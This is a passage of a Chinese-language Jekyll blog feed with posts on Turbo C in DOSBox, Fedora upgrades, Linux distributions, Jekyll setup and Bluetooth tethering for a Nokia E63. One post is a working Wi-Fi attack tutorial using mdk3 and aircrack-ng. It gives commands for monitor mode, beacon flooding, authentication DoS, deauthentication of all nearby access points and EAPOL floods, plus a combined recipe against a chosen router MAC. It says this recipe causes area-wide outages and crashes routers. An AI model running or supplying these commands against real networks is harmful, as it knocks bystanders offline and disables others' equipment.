        <link>http://example.com/jekyll/update/2016/09/23/Fedora%E5%85%B3%E9%97%AD%E5%90%88%E4%B8%8A%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95%E6%8C%82%E8%B5%B7.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/09/23/Fedora%E5%85%B3%E9%97%AD%E5%90%88%E4%B8%8A%E7%AC%94%E8%AE%B0%E6%9C%AC%E5%B1%8F%E5%B9%95%E6%8C%82%E8%B5%B7.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>在Fedora上使用TC3.0</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;Turbo C是美国Borland公司的产品，Borland公司是一家专门从事软件开发、研制的大公司。该公司相继推出了一套 Turbo系列软件, 如Turbo BASIC, Turbo Pascal, Turbo Prolog, 这些软件很受用户欢迎。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://download.pchome.net/development/linetools/detail-9113.html&quot;&gt;Turbo C3.0英文原版安装包&lt;/a&gt;&lt;br /&gt;
如何在Linux上使用Turbo C3.0呢？&lt;br /&gt;
我们将下载的安装包解压在/home/{username}/TurboC3.0中&lt;br /&gt;
现在我们需要安装DOSBOX来模拟DOS环境:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install dosbox.x86_64
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;安装完毕后我们打开dosbox，默认的提示符是Z，我们使用mount命令来挂载,使在dosbox内的程序将/home/{username}/TurboC3.0作为C:\&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount c /home/{username}/TurboC3.0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;打开C:\&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;进行安装:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;install
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;在安装界面中SOURCE drive选择C，也相当于/home/{username}/TurboC3.0&lt;br /&gt;
其余默认&lt;br /&gt;
最后选择start installation&lt;br /&gt;
完成后，TurboC3.0主程序会在/home/{username}/TurboC3.0/TC/BIN/TC.EXE&lt;/p&gt;

&lt;p&gt;再次打开DOSBOX&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mount c /home/{username}/TurboC3.0
c:
cd /tc/bin
tc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;OK,可以编写程序进行测试，如果不行，可以&lt;strong&gt;更改函数库路径&lt;/strong&gt;解决&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;祝你成功！&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 30 Aug 2016 08:41:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/30/%E5%9C%A8Fedora%E4%B8%8A%E4%BD%BF%E7%94%A8TC3.0.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/30/%E5%9C%A8Fedora%E4%B8%8A%E4%BD%BF%E7%94%A8TC3.0.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>使用mdk3+aircrack-ng攻击路由器</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;mdk3是一款Linux下的终端网络攻击工具，需要配合强大的aircrack -ng使用&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/charlesxsh/mdk3-master&quot;&gt;mdk3-Github&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://github.com/LEXUGE/mdk3-master&quot;&gt;mdk3-Github|LEXUGE’s fork&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.aircrack-ng.org/index.html&quot;&gt;aircrack -ng&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;现在mdk3的官网已经关闭了，在Github上还有mdk3 v6的原版改进版，为防止项目被删除，我也fork了一份，供大家备用下载。&lt;br /&gt;
mdk3的攻击过程中是不需要网络连接的，也就是在无网络的状态下攻击，希望大家不要恶意攻击他人，保持好自己的黑客道德。&lt;br /&gt;
教程在Fedora Linux下通过测试&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iwconfig&lt;/code&gt;&lt;br /&gt;
使用该命令来检查是哪一个接口来支持无线连接的，如我的就是wlp2s0&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iw dev wlp2s0 scan&lt;/code&gt;&lt;br /&gt;
用这个命令来扫描周围的Wi-Fi信息，SSID为路由器的名称，BSS为路由器的MAC地址&lt;strong&gt;（注意，截至目前，我们不需要安装任何软件）&lt;/strong&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dnf install aircrack-ng.x86_64&lt;/code&gt;&lt;br /&gt;
现在我们来安装mdk3和aircrack-ng(aircrack-ng可能名称会发生变动，具体请使用&lt;code class=&quot;highlighter-rouge&quot;&gt;$ dnf search aircrack-ng&lt;/code&gt;搜索软件包)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /mdk3-master
make
sudo make install
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
    &lt;p&gt;下载完mdk3并解压完毕后，即可进行编译安装，在&lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt;时会有gcc的编译警告，忽略即可，不必担心&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;5.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /usr/local/sbin
./mdk3
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;如果正确安装就可以看到mdk3输出的帮助&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;安装过程到此就完毕了&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;现在，我们来介绍如何攻击&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;su
airmon-ng start {你的接口，在第一步中可以找到}
cd /usr/local/sbin
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;第二条命令时，系统会自动关闭冲突进程，在最后会有监听端口，&lt;strong&gt;注意，接下来的mon0就使用监听端口代替&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;第一种模式：&lt;br /&gt;
beacon flood mode：&lt;br /&gt;
     这个模式可以产生大量死亡SSID来充斥无线客户端的无线列表，从而扰乱无线使用者；我们甚至还可以自定义发送死亡SSID的BSSID和ESSID、加密方式（如wep/wpa2）等。&lt;br /&gt;
详细命令如下：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 b 

      -n &amp;lt;ssid&amp;gt;        #自定义ESSID
      -f &amp;lt;filename&amp;gt;            #读取ESSID列表文件
      -v &amp;lt;filename&amp;gt;           #自定义ESSID和BSSID对应列表文件
      -d         #自定义为Ad-Hoc模式
      -w         #自定义为wep模式
      -g           #54Mbit模式
      -t            # WPA TKIP encryption
      -a           #WPA AES encryption
      -m          #读取数据库的mac地址
       -c &amp;lt;chan&amp;gt;                   #自定义信道
       -s &amp;lt;pps&amp;gt;                #发包速率
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;第二种模式：&lt;br /&gt;
Authentication DoS：&lt;br /&gt;
这是一种验证请求攻击模式：在这个模式里，软件自动模拟随机产生的mac向目标AP发起大量验证请求，可以导致AP忙于处理过多的请求而停止对正常连接客户端的响应；这个模式常见的使用是在reaver穷据路由PIN码，当遇到AP被“pin死”时，可以用这个模式来直接让AP停止正常响应，迫使AP主人重启路由！&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 a
      -a &amp;lt;ap_mac&amp;gt;              #测试指定BSS
      -m              #使用有效数据库中的客户端mac地址
      -c          #对应 -a ，不检查是否测试成功
      -i  &amp;lt;ap_mac&amp;gt;           #对指定BSS进行智能攻击
      -s &amp;lt;pps&amp;gt;               #速率，默认50
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;第三种模式：&lt;br /&gt;
Deauthentication/Disassociation Amok：&lt;br /&gt;
强制解除验证解除连接！在这个模式下，软件会向周围所有可见AP发起循环攻击……可以造成一定范围内的无线网络瘫痪（当然有白名单，黑名单模式），直到手动停止攻击！&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mdk3 mon0 d
      -w &amp;lt;filename&amp;gt;             #白名单mac地址列表文件
      -b &amp;lt;filename&amp;gt;              #黑名单mac地址列表文件
      -s &amp;lt;pps&amp;gt;                        #速率，这个模式下默认无限制
      -c [chan,chan,chan,...]                  #信道，可以多填，如 2,4,5,1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;第四种模式：&lt;br /&gt;
802.1X test:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mdk3 mon0 x  
      0 - EAPOL Start packet flooding   #EAPOL格式的报文洪水攻击

            -n &amp;lt;ssid&amp;gt;               
            -t &amp;lt;bssid&amp;gt;        #目标客户端的mac地址               

            -w &amp;lt;WPA type&amp;gt;
               Set WPA type (1: WPA, 2: WPA2/RSN; default: WPA)
            -u &amp;lt;unicast cipher&amp;gt;
               Set unicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
            -m &amp;lt;multicast cipher&amp;gt;
               Set multicast cipher type (1: TKIP, 2: CCMP; default: TKIP)
            -s &amp;lt;pps&amp;gt;      #速率，默认400               
      1 - EAPOL Logoff test       #注销认证攻击
            -t &amp;lt;bssid&amp;gt;        #目标客户端的mac地址             
            -c &amp;lt;bssid&amp;gt;         #目标ap的合法客户端mac               
            -s &amp;lt;pps&amp;gt;         #速率，默认400               
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;最后，建议这样攻击：&lt;br /&gt;
第一种和第三种同时使用会造成大面积间歇性断网，第二种可以配合第四种进行攻击，会导致路由器死亡&lt;br /&gt;
分别是&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./mdk3 mon0 b
./mdk3 mon0 d -s 120
./mdk3 mon0 a -a {你要攻击的路由器MAC(BSS)}
./mdk3 mon0 x 1 -c {客户端MAC(虚拟)} -t {路由器MAC(BSS)}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;祝你成功！&lt;/p&gt;
</description>
        <pubDate>Sun, 28 Aug 2016 11:47:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/28/%E4%BD%BF%E7%94%A8mdk3+aircrack-ng%E6%94%BB%E5%87%BB%E8%B7%AF%E7%94%B1%E5%99%A8.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>Fedora系统升级方法</title>
        <description>&lt;p&gt;&lt;a href=&quot;http://fedoraproject.org/wiki/DNF_system_upgrade&quot;&gt;Fedora官方教程&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo dnf upgrade --refresh
$ sudo dnf install dnf-plugin-system-upgrade
$ sudo dnf system-upgrade download --refresh --releasever=XX
$ sudo dnf system-upgrade reboot
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;其中&lt;code class=&quot;highlighter-rouge&quot;&gt;releasever=XX&lt;/code&gt;中的XX为版本号&lt;/p&gt;
</description>
        <pubDate>Sat, 27 Aug 2016 10:41:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/27/Fedora%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/27/Fedora%E7%B3%BB%E7%BB%9F%E5%8D%87%E7%BA%A7%E6%96%B9%E6%B3%95.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>为何选择Linux?</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。&lt;br /&gt;
Linux操作系统诞生于1991 年10 月5 日（这是第一次正式向外公布时间）。Linux存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、视频游戏控制台、台式计算机、大型机和超级计算机。&lt;br /&gt;
严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;GNU/Linux(以下简称Linux)与Microsoft Windows(以下简称Windows)有着本质的区别。Linux的核心是终端操作界面，而Windows的核心围绕的则是GUI。&lt;br /&gt;
不要以为Linux小众，其实，Windows才是小众的。我们所使用的Android就是使用的Linux内核，Apple公司的OS X系统和iOS系统使用的就是UNIX内核(Linux的祖先)，恰恰只有Windows这个另类是独立的。&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Linux有着极为清晰的操作系统设计理念。
    &lt;blockquote&gt;
      &lt;p&gt;一切都是文件、操作系统内核和软件包完全分离。而Windows则混为一潭，这也正是Windows运行速度越来越慢的秘密所在(不要听信那些所谓的“彻底卸载”、“深度清理”这在Windows上是天方夜谭，不管你如何清理，你也清理不了臃肿的注册表)&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Linux是一款免费的操作系统。
    &lt;blockquote&gt;
      &lt;p&gt;用户可以通过网络或其他途径免费获得，并可以任意修改其源代码。这是其他的操作系统所做不到的。正是由于这一点，来自全世界的无数程序员参与了Linux的修改、编写工作，程序员可以根据自己的兴趣和灵感对其进行改变，这让Linux吸收了无数程序员的精华，不断壮大。&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Linux支持多种平台
    &lt;blockquote&gt;
      &lt;p&gt;Linux可以运行在多种硬件平台上，如具有x86、680x0、SPARC、Alpha等处理器的平台。此外Linux还是一种嵌入式操作系统，可以运行在掌上电脑、机顶盒或游戏机上。2001年1月份发布的Linux 2.4版内核已经能够完全支持Intel 64位芯片架构。同时Linux也支持多处理器技术。多个处理器同时工作，使系统性能大大提高。&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
  &lt;li&gt;Linux是一款非常适合Geek、Hack的操作系统，当然也适合普通用户。那么，该如何入手Linux呢？&lt;/li&gt;
  &lt;li&gt;Linux本身的内核是我们无法使用的，我们需要使用发行版，也就是编译好的完整系统。Linux的发行版本大体可以分为两类，一类是商业公司维护的发行版本，以著名的Redhat（RHEL）为代表；一类是社区组织维护的发行版本，以Debian为代表。
    &lt;ol&gt;
      &lt;li&gt;Redhat，应称为Redhat系列，包括RHEL(Redhat Enterprise Linux，为收费版本)、Fedora Core(由Redhat桌面版本发展而来，免费)、CentOS(RHEL的社区克隆版本，免费)。Redhat可以说是在国内使用最多的Linux版本，甚至有人将Redhat等同于Linux。这个版本的特点就是使用人数多，资源多，而且网上的许多Linux教程也都以Redhat为例进行讲解。&lt;br /&gt;
  Redhat系列的包管理方式采用的是基于RPM包的YUM包管理方式，包分发方式是编译好的二进制文件。稳定性方面RHEL和CentOS的稳定性非常好，适合于服务器。&lt;br /&gt;
  如果你需要一个比较稳定的服务器系统，而且你不喜欢各种Linux的配置，那么你可以选择CentOS，在安装完成后经过简单的配置就能非常稳定地运行了！&lt;/li&gt;
      &lt;li&gt;Debian，或者称Debian系列，包括Debian和Ubuntu等。Debian是社区类Linux的典范，也最遵循GNU规范。Debian分为三个分支： stable, testing和unstable。其中，unstable为最新的测试版本，有相对较多的bug，适合桌面用户。testing的版本都经过测试，相对较为稳定。而stable一般只用于服务器，软件包大都比较过时，但是稳定和安全性都很高。Debian最具特色的是apt-get/dpkg包管理方式。&lt;br /&gt;
 Ubuntu严格来说不能算一个独立的发行版本，Ubuntu是基于Debian的unstable版本加强而来，可以说Ubuntu是一个拥有Debian所有的优点，以及自己所加强的优点的近乎完美的Linux桌面系统。根据选择的桌面系统不同，有三个版本可供选择，基于Gnome的Ubuntu，基于KDE的Kubuntu以及基于Xfc的Xubuntu。特点是界面非常友好，容易上手，对硬件的支持非常全面，是最适合做桌面系统的Linux发行版本。但十分&lt;strong&gt;臃肿！&lt;/strong&gt;&lt;br /&gt;
 如果你不需要自己进行定制，不想在系统上浪费太多时间，那么你可以根据自己的爱好在ubuntu、kubuntu以及xubuntu中选一款吧，三者的区别仅仅是桌面程序的不一样。&lt;/li&gt;
      &lt;li&gt;Fedora,它是一款优秀的Linux发行版，基于Redhat，为Redhat系的一员，由Redhat资助，社区维护。其软件包、系统内核、内核技术始终使用业界最新，使用了许多新技术。可以说是引领Linux界。安装起来也&lt;strong&gt;很简单，运行流畅，驱动支持性极好&lt;/strong&gt;，比较&lt;strong&gt;适合新手&lt;/strong&gt;。更重要的是&lt;strong&gt;Fedora一直没有背离Linux理念！&lt;/strong&gt;&lt;/li&gt;
      &lt;li&gt;Arch Linux是现阶段最好的滚动发行版。更重要的是 Arch 在其他方面也表现良好。&lt;br /&gt;
 Arch Linux 是一个为那些想了解 Linux 一切的人准备的发行版，因为你必须手动安装一切，它会让你学会基于 Linux 的操作系统的每个部分。Arch Linux 是最可定制的发行版，你获得的只是一个基础系统，然后你可以在它上面建立属于你个人的发行版。不论好坏，它都不像 openSUSE 和 Ubuntu，它没有额外的补丁和整合内容，你甚至可以获得上游开发者创建的内容。Arch Linux 也是最好的滚动发行版之一。他总是更新，用户始终使用最新的软件包，并且他们还可以通过稳定的存储库运行预发布软件。Arch 也因优异的文档闻名。 Arch Wiki 可以让我得到任何 Linux 相关的资料。它提供的所有的包和软件都可在“任何” Linux 发行版上运行。&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;我使用的就是Fedora，没有任何的问题，得益于Redhat的强大。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;最后祝你：Linux使用愉快！&lt;/strong&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 27 Aug 2016 09:35:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/27/%E4%B8%BA%E4%BD%95%E9%80%89%E6%8B%A9Linux.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/27/%E4%B8%BA%E4%BD%95%E9%80%89%E6%8B%A9Linux.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>如何在Github上搭建Jekyll博客</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;Jekyll 是一个简单的博客形态的静态站点生产机器。它有一个模版目录，其中包含原始文本格式的文档，通过 Markdown （或者 Textile） 以及 Liquid 转化成一个完整的可发布的静态网站，你可以发布在任何你喜爱的服务器上。Jekyll 也可以运行在 GitHub Page 上，也就是说，你可以使用 GitHub 的服务来搭建你的项目页面、博客或者网站，而且是完全免费的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://jekyllrb.com/&quot;&gt;Jekyll 官网&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://jekyll.bootcss.com/&quot;&gt;Jekyll 国内镜像&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Jekyll的安装过程还是比较坎坷的&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;首先安装RubyGems
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo dnf install rubygems
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;安装完成后你得安装一些devel包，包括ruby-devel, libffi-devel, libxml2-devel, libyaml-devel等&lt;/li&gt;
  &lt;li&gt;完成后执行以下命令
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo gem install jekyll
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;如果全程无报错，那么恭喜你，你已经成功一大半了，试试这个
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jekyll -v
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;如果正常返回版本号的话，输入以下命令
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bundle
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;系统会提示你安装bundle，安装完成后，整个安装过程就OK了！&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;OK,接下来，我们就要搭建第一个自己的第一个BLOG了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;首先在Github上创建一个仓库，名字为{username}.github.io&lt;/li&gt;
  &lt;li&gt;完了之后执行下面命令(你已经安装完并配置了GIT)
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo git clone {你的仓库git地址}
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;接下来，我们就要来生成BLOG了，使用下面的命令
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jekyll new blog
cd blog
jekyll serve
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;现在，你的BLOG已经在http://localhost:4000/上了！&lt;/li&gt;
  &lt;li&gt;只要将你的_site文件夹里的内容复制进GIT仓库，并执行以下命令(在GIT仓库的目录下）就可以在{username}.github.io访问了
    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo git add --all
sudo git commit -m &quot;提交信息&quot;
sudo git push
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;完成！
    &lt;blockquote&gt;
      &lt;p&gt;建议使用&lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve --watch&lt;/code&gt;模式，这样系统一检测到改动就会自动生成，无需build&lt;br /&gt;
请将文章写在_posts文件夹下&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By LEXUGE&lt;/p&gt;

</description>
        <pubDate>Fri, 26 Aug 2016 14:24:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/26/%E5%A6%82%E4%BD%95%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BAJekyll%E5%8D%9A%E5%AE%A2.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/26/%E5%A6%82%E4%BD%95%E5%9C%A8Github%E4%B8%8A%E6%90%AD%E5%BB%BAJekyll%E5%8D%9A%E5%AE%A2.html</guid>
        
        
        <category>jekyll</category>
        
        <category>update</category>
        
      </item>
    
      <item>
        <title>E63蓝牙上网</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;对于国行的E63来说，并不配备有Wi-Fi功能，所以，就得近肯能的使用其他的
免费数据连接来代替这一功能，其中最棒的选择就是Bluetooth连接。但是，Bluetooth连接
只能创建两个终端的Peer to Peer连接或多个终端之间的LAN。这并不能获得外部数据。如何
解决这一致命问题呢？&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;可以使用另一台终端，其可直接访问Internet（比如笔记本），如同
代理服务器一样，把E63用Bluetooth发送过来的网络请求进行执行，再把外部传回来的信息
通过Bluetooth传回给E63，实现E63直接访问Internet的效果。示意图如下：&lt;/p&gt;

&lt;p&gt;发送：
     蓝牙        网络连接
E63  —&amp;gt;  笔记本  —&amp;gt;  Internet&lt;/p&gt;

&lt;p&gt;接收：
     蓝牙        网络连接
E63  &amp;lt;—  笔记本  &amp;lt;—  Internet&lt;/p&gt;

&lt;p&gt;思路就是这样，那么，该如何实现呢？
以Windows为例，有以下教程：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;下载Hiisi 1.6.3 （在文章末尾，这是Bluetooth代理套件，有客户端和服务端）&lt;/li&gt;
  &lt;li&gt;下载并安装JRE（Java运行环境），已有的可跳过本步骤，在CMD中输入java –version
可验证是否正确配置该环境&lt;/li&gt;
  &lt;li&gt;（重要！！！）.在E63上新创建一个接入点，连接名称可命名为BLUETOOTH（命名随意）其他基本默认，分别如下：&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;p&gt;数据承载方式：分组数据 &lt;br /&gt;
接入点名称：无&lt;br /&gt;
用户名：无&lt;br /&gt;
提示输入密码：否&lt;br /&gt;
密码：&lt;strong&gt;**&lt;/strong&gt;&lt;strong&gt;**&lt;/strong&gt;&lt;br /&gt;
鉴定：普通&lt;br /&gt;
主页：无&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;然后点击选项-&amp;gt;高级设置，设置如下：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;网络类型：IPv4&lt;br /&gt;
手机IP地址：自动&lt;br /&gt;
DNS地址：自动&lt;br /&gt;
代理服务器地址：127.0.0.1&lt;br /&gt;
代理端口号码：1234&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;解压Hiisi 1.6.3，将hiisi1.6.3\hiisi\bin目录中的jad、jar两个文件提取，放置到E63的
E盘安装（注意！！！安装时一定先运行hiisi.JAD,而不是JAR！)&lt;/li&gt;
  &lt;li&gt;打开蓝牙的设置，在“COM 端口”选项卡中，单击添加-&amp;gt;确定，记下前面的端口号，比如：COM19&lt;/li&gt;
  &lt;li&gt;进入Hiisi 1.6.3\Pihatonttu目录。右击-&amp;gt;编辑，将COM XXXX改成你刚刚记下的端口号&lt;/li&gt;
  &lt;li&gt;将E63与电脑建立Bluetooth连接，建议添加信任设备&lt;/li&gt;
  &lt;li&gt;在Bluetooth设置的选项中将笔记本设为可见设备&lt;/li&gt;
  &lt;li&gt;现在运行Pihatonttu.cmd，若提示端口已被占用，请检查占用情况&lt;/li&gt;
  &lt;li&gt;在E63上找到刚刚安装的Hiisi Proxy，并打开&lt;/li&gt;
  &lt;li&gt;选择允许Hiisi Proxy使用网络或收发数据，并选择Bluetooth Mode（蓝牙模式）&lt;/li&gt;
  &lt;li&gt;会寻找蓝牙设备，搜寻完后，选择你的设备名，完毕后，会搜索端口，选择端口&lt;/li&gt;
  &lt;li&gt;此时，我们要确保连接是否工作，按选项-&amp;gt;Setting,勾选Check now，按OK
这时，系统会检测，若出现：Bluetooth connection is available，恭喜你，连接成功
若出现Bluetooth connection is not available，请单击选项-&amp;gt;Restart，再重复13步&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;接下来就可以网上冲浪啦!&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;注意！！！请不要按Exit退出，按左边的房子按键退出，可确保
代理程序在后台运行&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;以后，只需打开Pihatonttu.cmd，然后手机端连接即可
此外，在访问Internet的时候有几点要注意：
这是通过代理服务器访问，速度较慢，请缓慢操作
并不是非常稳定，并且服务端需要处理数据，请缓慢操作&lt;/p&gt;

&lt;p&gt;出现断线情况可按照13步检测并重启
By LEXUGE&lt;/p&gt;

</description>
        <pubDate>Fri, 26 Aug 2016 14:04:00 +0800</pubDate>
        <link>http://example.com/jekyll/update/2016/08/26/E63%E8%93%9D%E7%89%99%E4%B8%8A%E7%BD%91.html</link>
        <guid isPermaLink="true">http://example.com/jekyll/update/2016/08/26/E63%E8%93%9D%E7%89%99%E4%B8%8A%E7%BD%91.html</guid>
        
        
